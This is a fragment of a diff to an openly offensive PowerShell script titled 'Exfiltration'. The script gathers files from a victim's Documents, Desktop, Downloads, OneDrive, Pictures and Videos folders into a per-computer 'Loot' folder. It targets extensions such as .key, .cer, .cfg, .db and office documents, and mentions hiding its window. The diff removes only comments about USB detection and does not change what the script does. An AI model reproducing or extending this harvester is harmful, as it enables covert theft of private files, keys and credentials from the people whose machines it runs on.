@@ -3,7 +3,6 @@
 [Console]::Title = "Exfiltration"
 Clear-Host
 
-# Skip USB detection, directly set destination to C: drive folder
 $destinationPath = "C:\ExfiltratedFiles\$env:COMPUTERNAME-Loot"
 
 if (-not (Test-Path -Path $destinationPath)) {
@@ -15,7 +14,6 @@ if (-not (Test-Path -Path $destinationPath)) {
 $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
 $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")  
 
-# Remove the USB detection logic and directly set the folder path
 Write-Host "Loot Folder Set To: $destinationPath" -ForegroundColor Green
 
 # Check if the user wants to hide the window
